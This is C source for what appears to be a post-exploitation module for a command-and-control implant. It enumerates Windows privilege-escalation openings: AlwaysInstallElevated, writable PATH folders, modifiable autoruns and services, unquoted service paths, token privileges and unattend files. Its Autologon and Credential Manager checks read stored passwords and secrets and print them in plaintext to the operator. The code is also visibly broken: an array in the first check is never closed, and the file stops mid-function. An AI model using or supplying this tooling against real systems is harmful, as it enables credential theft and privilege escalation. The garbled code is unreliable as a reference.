#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <wincred.h>
#include <processthreadsapi.h>
#include "bofdefs.h"
#include "beacon.h"
#include "vulndrivers.h"

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof(arr[0]))
#define BUFSIZE     1024
#define SHA256LEN   32
#define SHA1LEN     20
#define MD5LEN      16

/* ============================================================
 * CHECK: AlwaysInstallElevated
 * ============================================================ */
void CheckAlwaysInstallElevated() {
    HKEY hKey;
    DWORD alwaysInstallElevated = 0;
    DWORD bufferSize = sizeof(DWORD);
    const TCHAR* subkeys[] = {
        TEXT("HKEY_CURRENT_USER"),
        TEXT("HKEY_LOCAL_MACHINE")

    BeaconPrintf(CALLBACK_OUTPUT, "=== AlwaysInstallElevated Check ===\n");

    for (int i = 0; i < ARRAY_SIZE(subkeys); i++) {
        if (ADVAPI32$RegOpenKeyExA((i == 0) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE,
            TEXT("Software\\Policies\\Microsoft\\Windows\\Installer"),
            0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {

            if (ADVAPI32$RegQueryValueExA(hKey, TEXT("AlwaysInstallElevated"),
                NULL, NULL, (LPBYTE)&alwaysInstallElevated, &bufferSize) == ERROR_SUCCESS) {
                if (alwaysInstallElevated == 1) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Always Install Elevated Check Result: Vulnerable\n", subkeys[i]);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Always Install Elevated Check Result: Not Vulnerable\n", subkeys[i]);
                }
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Unable to query AlwaysInstallElevated value.\n", subkeys[i]);
            }
            ADVAPI32$RegCloseKey(hKey);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Registry key for AlwaysInstallElevated does not seem to exist.\n", subkeys[i]);
        }
    }
}

/* ============================================================
 * CHECK: Autologon
 * ============================================================ */
void CheckAutologon() {
    HKEY hKey = NULL;
    DWORD dwSize = 0;
    DWORD dwType = 0;
    char szAutoLogon[16] = {0};
    char szUserName[256] = {0};
    char szDomain[256] = {0};
    char szPassword[256] = {0};
    BOOL bAutoLogonFound = FALSE;
    BOOL bUserNameFound = FALSE;
    BOOL bDomainFound = FALSE;
    BOOL bPasswordFound = FALSE;
    LONG lResult = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Autologon Check ===\n");

    lResult = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] Failed to open Winlogon registry key (error: 0x%lX)\n", lResult);
        return;
    }

    dwSize = sizeof(szAutoLogon);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, &dwType, (LPBYTE)szAutoLogon, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: %s\n", szAutoLogon);
        bAutoLogonFound = TRUE;
    }

    dwSize = sizeof(szDomain);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "DefaultDomainName", NULL, &dwType, (LPBYTE)szDomain, &dwSize);
    if (lResult == ERROR_SUCCESS && szDomain[0] != '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultDomainName: %s\n", szDomain);
        bDomainFound = TRUE;
    }

    dwSize = sizeof(szUserName);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "DefaultUserName", NULL, &dwType, (LPBYTE)szUserName, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: %s\n", szUserName);
        bUserNameFound = TRUE;
    }

    dwSize = sizeof(szPassword);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "DefaultPassword", NULL, &dwType, (LPBYTE)szPassword, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: %s\n", szPassword);
        bPasswordFound = TRUE;
    }

    if (!bAutoLogonFound) BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: Not Found\n");
    if (!bUserNameFound)  BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: Not Found\n");
    if (!bPasswordFound)  BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: Not Found\n");

    if (bAutoLogonFound && szAutoLogon[0] == '1' && bPasswordFound) {
        if (bDomainFound) {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] VULNERABLE: Autologon credentials stored: %s\\%s:%s\n", szDomain, szUserName, szPassword);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] VULNERABLE: Autologon credentials stored: %s:%s\n", szUserName, szPassword);
        }
    } else if (bAutoLogonFound && szAutoLogon[0] == '1') {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon enabled but no DefaultPassword found.\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] Not vulnerable: Autologon not enabled or no credentials stored\n");
    }

    ADVAPI32$RegCloseKey(hKey);
}

/* ============================================================
 * CHECK: CredentialManager
 * ============================================================ */
void CheckCredentialManager() {
    DWORD dwCount = 0;
    PCREDENTIALA *pCredentials = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Credential Manager Check ===\n");

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &dwCount, &pCredentials)) {
        DWORD dwErr = KERNEL32$GetLastError();
        if (dwErr == ERROR_NOT_FOUND) {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] No credentials found in Credential Manager\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] Error enumerating credentials: 0x%lX\n", dwErr);
        }
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] Found %lu credential(s)\n", dwCount);
    for (DWORD i = 0; i < dwCount; i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] --- Credential [%lu] ---\n", i + 1);
        if (pCredentials[i]->TargetName != NULL)
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   Target: %s\n", pCredentials[i]->TargetName);
        if (pCredentials[i]->UserName != NULL)
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   User:   %s\n", pCredentials[i]->UserName);
        if (pCredentials[i]->CredentialBlobSize > 0 && pCredentials[i]->CredentialBlob != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   Secret: %.*s\n",
                pCredentials[i]->CredentialBlobSize, (char*)pCredentials[i]->CredentialBlob);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   Secret: <empty or protected>\n");
        }
    }
    ADVAPI32$CredFree(pCredentials);
}

/* ============================================================
 * CHECK: HijackablePath
 * ============================================================ */
void CheckHijackablePath() {
    HKEY hKey;
    LONG openResult;
    LONG queryResult;
    DWORD valueType;
    char data[1024];
    DWORD dataSize = sizeof(data);
    DWORD len;
    HANDLE hToken, hImpersonatedToken;
    DWORD GenericAccess = FILE_ADD_FILE;
    int NumOfWritablePaths = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Hijackable Path Check ===\n");

    openResult = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0, KEY_READ, &hKey);
    if (openResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[WRITABLE_PATH] Error opening registry key: %d\n", openResult);
        return;
    }

    queryResult = ADVAPI32$RegQueryValueExA(hKey, "Path", NULL, &valueType, (LPBYTE)data, &dataSize);
    if (queryResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[WRITABLE_PATH] Error querying registry value: %d\n", queryResult);
        ADVAPI32$RegCloseKey(hKey);
        return;
    }

    char* pathToken = MSVCRT$strtok(data, ";");
    while (pathToken != NULL) {
        DWORD attributes = KERNEL32$GetFileAttributesA(pathToken);
        if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (!ADVAPI32$GetFileSecurityA(pathToken, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, 0, &len) && ERROR_INSUFFICIENT_BUFFER == KERNEL32$GetLastError()) {
                PSECURITY_DESCRIPTOR security = MSVCRT$malloc(len);
                if (security && ADVAPI32$GetFileSecurityA(pathToken, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, security, len, &len)) {
                    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | STANDARD_RIGHTS_READ, &hToken)) {
                        if (ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hImpersonatedToken)) {
                            GENERIC_MAPPING mapping = { FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_GENERIC_EXECUTE, FILE_ALL_ACCESS };
                            PRIVILEGE_SET privileges = { 0 };
                            DWORD grantedAccess = 0, privilegesLength = sizeof(privileges);
                            BOOL result = FALSE;
                            if (ADVAPI32$AccessCheck(security, hImpersonatedToken, GenericAccess, &mapping, &privileges, &privilegesLength, &grantedAccess, &result)) {
                                if (result) {
                                    BeaconPrintf(CALLBACK_OUTPUT, "[WRITABLE_PATH] Found writable directory in PATH: %s\n", pathToken);
                                    NumOfWritablePaths++;
                                }
                            }
                            KERNEL32$CloseHandle(hImpersonatedToken);
                        }
                        KERNEL32$CloseHandle(hToken);
                    }
                    MSVCRT$free(security);
                }
            }
        }
        pathToken = MSVCRT$strtok(NULL, ";");
    }
    ADVAPI32$RegCloseKey(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "[WRITABLE_PATH] Found %d writable directories in PATH\n", NumOfWritablePaths);
}

/* ============================================================
 * CHECK: ModifiableAutorun
 * ============================================================ */
void CheckModifiableAutorun() {
    HKEY hKey = NULL;
    LONG lResult = 0;
    char szValueName[256];
    char szValueData[512];
    char szPath[512];
    DWORD dwValueNameSize, dwValueDataSize, dwType, dwIndex;
    int nFound = 0;
    int p, q;
    HANDLE hFile;

    const char* pszHives[] = { "HKLM", "HKCU" };
    HKEY hRoots[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    const char* pszSubkeys[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    };

    BeaconPrintf(CALLBACK_OUTPUT, "=== Modifiable Autorun Check ===\n");

    for (int i = 0; i < 2; i++) {
        for (int k = 0; k < 4; k++) {
            lResult = ADVAPI32$RegOpenKeyExA(hRoots[i], pszSubkeys[k], 0, KEY_READ, &hKey);
            if (lResult != ERROR_SUCCESS) continue;

            dwIndex = 0;
            while (1) {
                dwValueNameSize = sizeof(szValueName);
                dwValueDataSize = sizeof(szValueData);
                lResult = ADVAPI32$RegEnumValueA(hKey, dwIndex, szValueName, &dwValueNameSize,
                    NULL, &dwType, (LPBYTE)szValueData, &dwValueDataSize);
                if (lResult != ERROR_SUCCESS) break;

                if (dwType == REG_SZ || dwType == REG_EXPAND_SZ) {
                    szValueData[dwValueDataSize] = '\0';
                    p = 0; q = 0;
                    while (szValueData[p] == ' ') p++;
                    if (szValueData[p] == '"') {
                        p++;
                        while (szValueData[p] != '\0' && szValueData[p] != '"' && q < 510) szPath[q++] = szValueData[p++];
                    } else {
                        while (szValueData[p] != '\0' && szValueData[p] != ' ' && q < 510) szPath[q++] = szValueData[p++];
                    }
                    szPath[q] = '\0';

                    hFile = KERNEL32$CreateFileA(szPath, GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        KERNEL32$CloseHandle(hFile);
                        BeaconPrintf(CALLBACK_OUTPUT, "[AUTORUN] WRITABLE: %s\\%s\n", pszHives[i], pszSubkeys[k]);
                        BeaconPrintf(CALLBACK_OUTPUT, "[AUTORUN]   Name: %s\n", szValueName);
                        BeaconPrintf(CALLBACK_OUTPUT, "[AUTORUN]   Path: %s\n", szValueData);
                        nFound++;
                    }
                }
                dwIndex++;
            }
            ADVAPI32$RegCloseKey(hKey);
            hKey = NULL;
        }
    }

    if (nFound > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTORUN] VULNERABLE: %d modifiable autorun(s) found!\n", nFound);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTORUN] Not vulnerable: No modifiable autoruns found\n");
    }
}

/* ============================================================
 * CHECK: ModifiableService
 * ============================================================ */
static BOOL HasModifyRights(ACCESS_MASK mask) {
    if (mask & SERVICE_CHANGE_CONFIG)  return TRUE;
    if (mask & WRITE_DAC)              return TRUE;
    if (mask & WRITE_OWNER)            return TRUE;
    if (mask & GENERIC_ALL)            return TRUE;
    if (mask & GENERIC_WRITE)          return TRUE;
    if (mask & SERVICE_ALL_ACCESS)     return TRUE;
    return FALSE;
}

void CheckModifiableService() {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    HANDLE hToken = NULL;
    HANDLE hHeap = NULL;
    LPBYTE pServices = NULL;
    LPENUM_SERVICE_STATUS_PROCESSA pServiceStatus = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    LPQUERY_SERVICE_CONFIGA pConfig = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResumeHandle = 0;
    DWORD dwBufferSize = 0, dwSDSize = 0, dwConfigSize = 0, dwTokenInfoSize = 0;
    int nVulnerable = 0;
    BOOL bDaclPresent = FALSE, bDaclDefaulted = FALSE;
    PACL pDacl = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Modifiable Service Check ===\n");

    hHeap = KERNEL32$GetProcessHeap();

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC] Failed to open process token. Error: %lu\n", KERNEL32$GetLastError());
        return;
    }

    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwTokenInfoSize);
    pTokenUser = (PTOKEN_USER)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwTokenInfoSize);
    if (!pTokenUser || !ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenInfoSize, &dwTokenInfoSize)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC] Failed to get token user\n");
        goto modsvc_cleanup;
    }

    hSCManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCManager) {
        BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC] Failed to open SCM. Error: %lu\n", KERNEL32$GetLastError());
        goto modsvc_cleanup;
    }

    ADVAPI32$EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL);
    dwBufferSize = dwBytesNeeded;
    pServices = (LPBYTE)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
    if (!pServices) goto modsvc_cleanup;

    dwResumeHandle = 0;
    if (!ADVAPI32$EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, pServices, dwBufferSize, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL)) {
        goto modsvc_cleanup;
    }

    pServiceStatus = (LPENUM_SERVICE_STATUS_PROCESSA)pServices;

    for (DWORD i = 0; i < dwServicesReturned; i++) {
        hService = ADVAPI32$OpenServiceA(hSCManager, pServiceStatus[i].lpServiceName, READ_CONTROL | SERVICE_QUERY_CONFIG);
        if (!hService) continue;

        dwSDSize = 0;
        ADVAPI32$QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, NULL, 0, &dwSDSize);
        if (dwSDSize == 0) { ADVAPI32$CloseServiceHandle(hService); hService = NULL; continue; }

        pSD = (PSECURITY_DESCRIPTOR)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSDSize);
        if (!pSD || !ADVAPI32$QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, pSD, dwSDSize, &dwSDSize)) {
            if (pSD) { KERNEL32$HeapFree(hHeap, 0, pSD); pSD = NULL; }
            ADVAPI32$CloseServiceHandle(hService); hService = NULL; continue;
        }

        pDacl = NULL;
        if (!ADVAPI32$GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted) || !bDaclPresent || !pDacl) {
            KERNEL32$HeapFree(hHeap, 0, pSD); pSD = NULL;
            ADVAPI32$CloseServiceHandle(hService); hService = NULL; continue;
        }

        for (DWORD j = 0; j < pDacl->AceCount; j++) {
            PACE_HEADER pAceHeader = NULL;
            if (!ADVAPI32$GetAce(pDacl, j, (LPVOID*)&pAceHeader)) continue;
            if (pAceHeader->AceType != ACCESS_ALLOWED_ACE_TYPE) continue;
            PACCESS_ALLOWED_ACE pAce = (PACCESS_ALLOWED_ACE)pAceHeader;
            PSID pAceSid = (PSID)&pAce->SidStart;
            if (!HasModifyRights(pAce->Mask)) continue;

            BOOL bMatch = FALSE;
            if (ADVAPI32$EqualSid(pAceSid, pTokenUser->User.Sid)) bMatch = TRUE;
            else ADVAPI32$CheckTokenMembership(hToken, pAceSid, &bMatch);

            if (bMatch) {
                dwConfigSize = 0;
                ADVAPI32$QueryServiceConfigA(hService, NULL, 0, &dwConfigSize);
                if (dwConfigSize > 0) {
                    pConfig = (LPQUERY_SERVICE_CONFIGA)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwConfigSize);
                    if (pConfig && ADVAPI32$QueryServiceConfigA(hService, pConfig, dwConfigSize, &dwConfigSize)) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC] VULNERABLE: %s\n", pServiceStatus[i].lpServiceName);
                        BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC]   Display: %s\n", pConfig->lpDisplayName ? pConfig->lpDisplayName : "N/A");
                        BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC]   Binary:  %s\n", pConfig->lpBinaryPathName ? pConfig->lpBinaryPathName : "N/A");
                        nVulnerable++;
                    }
                    if (pConfig) { KERNEL32$HeapFree(hHeap, 0, pConfig); pConfig = NULL; }
                }
                break;
            }
        }
        KERNEL32$HeapFree(hHeap, 0, pSD); pSD = NULL;
        ADVAPI32$CloseServiceHandle(hService); hService = NULL;
    }

    if (nVulnerable > 0) BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC] Found %d modifiable service(s)!\n", nVulnerable);
    else BeaconPrintf(CALLBACK_OUTPUT, "[MODSVC] No modifiable services found\n");

modsvc_cleanup:
    if (pConfig) KERNEL32$HeapFree(hHeap, 0, pConfig);
    if (pSD) KERNEL32$HeapFree(hHeap, 0, pSD);
    if (pServices) KERNEL32$HeapFree(hHeap, 0, pServices);
    if (pTokenUser) KERNEL32$HeapFree(hHeap, 0, pTokenUser);
    if (hService) ADVAPI32$CloseServiceHandle(hService);
    if (hSCManager) ADVAPI32$CloseServiceHandle(hSCManager);
    if (hToken) KERNEL32$CloseHandle(hToken);
}

/* ============================================================
 * CHECK: TokenPrivileges
 * ============================================================ */
static BOOL IsVulnerablePrivilege(char * privilegeNameBuffer) {
    static const char * KnownVulnerable[] = {
        "SeAssignPrimaryToken", "SeBackupPrivilege", "SeCreateTokenPrivilege",
        "SeRestorePrivilege", "SeDebugPrivilege", "SeImpersonatePrivilege",
        "SeLoadDriverPrivilege", "SeManageVolumePrivilege", "SeTcbPrivilege",
        "SeTakeOwnershipPrivilege", NULL
    };
    int i = 0;
    while (KnownVulnerable[i]) {
        if (MSVCRT$_stricmp(KnownVulnerable[i], privilegeNameBuffer) == 0) return TRUE;
        i++;
    }
    return FALSE;
}

void CheckTokenPrivileges() {
    HANDLE tokenHandle;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Token Privileges Check ===\n");

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tokenHandle)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[PRIVILEGE] Failed to open process token. Error: %lu\n", KERNEL32$GetLastError());
        return;
    }

    DWORD tokenInfoSize = 0;
    ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &tokenInfoSize);
    if (tokenInfoSize == 0) { KERNEL32$CloseHandle(tokenHandle); return; }

    PTOKEN_PRIVILEGES tokenPrivileges = (PTOKEN_PRIVILEGES)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, tokenInfoSize);
    if (!tokenPrivileges) { KERNEL32$CloseHandle(tokenHandle); return; }

    if (ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, tokenPrivileges, tokenInfoSize, &tokenInfoSize)) {
        for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; ++i) {
            LUID privilegeLuid = tokenPrivileges->Privileges[i].Luid;
            char privilegeNameBuffer[256];
            DWORD bufferSize = sizeof(privilegeNameBuffer);
            if (ADVAPI32$LookupPrivilegeNameA(NULL, &privilegeLuid, privilegeNameBuffer, &bufferSize)) {
                BOOL isEnabled = (tokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED;
                BOOL isVulnerable = IsVulnerablePrivilege(privilegeNameBuffer);
                BeaconPrintf(CALLBACK_OUTPUT, "[PRIVILEGE] %s: %s %s\n", privilegeNameBuffer,
                    isEnabled ? "Enabled" : "Disabled", isVulnerable ? "- Vulnerable" : "");
            }
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tokenPrivileges);
    KERNEL32$CloseHandle(tokenHandle);
}

/* ============================================================
 * CHECK: UnattendFiles
 * ============================================================ */
void CheckUnattendFiles() {
    char szWinDir[MAX_PATH * 2];
    int NumOfFoundFiles = 0;
    HANDLE hFile;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Unattend Files Check ===\n");

    if (KERNEL32$GetWindowsDirectoryA(szWinDir, sizeof(szWinDir)) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UNATTEND_FILES] Failed to resolve Windows directory\n");
        return;
    }

    static const char * UnattendFiles[] = {
        "\\sysprep\\sysprep.xml", "\\sysprep\\sysprep.inf", "\\sysprep.inf",
        "\\Panther\\Unattended.xml", "\\Panther\\Unattend.xml",
        "\\Panther\\Unattend\\Unattend.xml", "\\Panther\\Unattend\\Unattended.xml",
        "\\System32\\Sysprep\\unattend.xml", "\\System32\\Sysprep\\Panther\\unattend.xml", NULL
    };

    for (int i = 0; UnattendFiles[i] != NULL; i++) {
        char FullPath[MAX_PATH * 2];
        USER32$wsprintfA(FullPath, "%s%s", szWinDir, UnattendFiles[i]);
        hFile = KERNEL32$CreateFileA(FullPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_OUTPUT, "[UNATTEND_FILES] Unattend file found: %s\n", FullPath);
            NumOfFoundFiles++;
            KERNEL32$CloseHandle(hFile);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[UNATTEND_FILES] Found a total of %d unattend files\n", NumOfFoundFiles);
}

/* ============================================================
 * CHECK: UnquotedServicePath
 * ============================================================ */
void CheckUnquotedServicePath() {
    HKEY servicesKey;
    BOOL foundVulnerablePath = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Unquoted Service Path Check ===\n");

    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\", 0, KEY_READ, &servicesKey) == ERROR_SUCCESS) {
        char serviceSubkeyName[256];
        DWORD subkeyIndex = 0;
        DWORD subkeyNameSize = sizeof(serviceSubkeyName);
        while (TRUE) {
            subkeyNameSize = sizeof(serviceSubkeyName);
            if (ADVAPI32$RegEnumKeyExA(servicesKey, subkeyIndex++, serviceSubkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

            HKEY imagePathKey;
            if (ADVAPI32$RegOpenKeyExA(servicesKey, serviceSubkeyName, 0, KEY_READ, &imagePathKey) == ERROR_SUCCESS) {
                char imagePathValue[1024] = { 0 };
                DWORD valueSize = sizeof(imagePathValue);
                if (ADVAPI32$RegGetValueA(imagePathKey, NULL, "ImagePath", RRF_RT_REG_SZ, NULL, &imagePathValue, &valueSize) != ERROR_SUCCESS) {
                    ADVAPI32$RegCloseKey(imagePathKey); continue;
                }
                if (SHLWAPI$StrStrIA(imagePathValue, " ") == NULL || SHLWAPI$StrStrIA(imagePathValue, "\"") != NULL) {
                    ADVAPI32$RegCloseKey(imagePathKey); continue;
                }
                if (SHLWAPI$StrStrIA(imagePathValue, "System32") != NULL ||
                    SHLWAPI$StrStrIA(imagePathValue, "SysWow64") != NULL ||
                    SHLWAPI$StrStrIA(imagePathValue, ".sys") != NULL) {
                    ADVAPI32$RegCloseKey(imagePathKey); continue;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "[SERVICE_PATH] Service '%s' has an unquoted executable path: %s\n", serviceSubkeyName, imagePathValue);
                foundVulnerablePath = TRUE;
                ADVAPI32$RegCloseKey(imagePathKey);
            }
        }
        ADVAPI32$RegCloseKey(servicesKey);
    }
    if (!foundVulnerablePath) BeaconPrintf(CALLBACK_OUTPUT, "[SERVICE_PATH] No unquoted service paths found\n");
}

/* ============================================================
 * CHECK: PowerShellHistory
 * ============================================================ */
void CheckPowerShellHistory() {
    char szPath[MAX_PATH];
    char szAppData[MAX_PATH];
    DWORD dwSize;
    HANDLE hFile;
    LARGE_INTEGER liFileSize;
    int i, j;
    const char* pszSubPath = "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";

    BeaconPrintf(CALLBACK_OUTPUT, "=== PowerShell History Check ===\n");

    dwSize = KERNEL32$GetEnvironmentVariableA("APPDATA", szAppData, sizeof(szAppData));
    if (dwSize == 0 || dwSize >= sizeof(szAppData)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY] Failed to get APPDATA path\n");
        return;
    }

    i = 0;
    while (szAppData[i] != '\0' && i < MAX_PATH - 1) { szPath[i] = szAppData[i]; i++; }
    j = 0;
    while (pszSubPath[j] != '\0' && i < MAX_PATH - 1) { szPath[i] = pszSubPath[j]; i++; j++; }
    szPath[i] = '\0';

    hFile = KERNEL32$CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD dwErr = KERNEL32$GetLastError();
        if (dwErr == ERROR_FILE_NOT_FOUND || dwErr == ERROR_PATH_NOT_FOUND)
            BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY] PowerShell history file not found: %s\n", szPath);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY] Error accessing file. Error: %lu\n", dwErr);
        return;
    }

    liFileSize.QuadPart = 0;
    KERNEL32$GetFileSizeEx(hFile, &liFileSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY] PowerShell history file found!\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY]   Path: %s\n", szPath);
    if (liFileSize.QuadPart >= 1048576)
        BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY]   Size: %lu MB\n", (DWORD)(liFileSize.QuadPart / 1048576));
    else if (liFileSize.QuadPart >= 1024)
        BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY]   Size: %lu KB\n", (DWORD)(liFileSize.QuadPart / 1024));
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[PSHISTORY]   Size: %lu bytes\n", (DWORD)liFileSize.QuadPart);

    KERNEL32$CloseHandle(hFile);
}

/* ============================================================
 * CHECK: UACStatus
 * ============================================================ */
void CheckUACStatus() {
    HKEY hKey = NULL;
    LONG lResult;
    DWORD dwEnableLUA = 0, dwConsentPrompt = 0, dwSecureDesktop = 0;
    DWORD dwSize = sizeof(DWORD), dwType = 0;
    HANDLE hToken = NULL;
    DWORD dwIntegrityLevel = 0, dwLengthNeeded = 0;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    PTOKEN_GROUPS pTokenGroups = NULL;
    HANDLE hHeap = NULL;
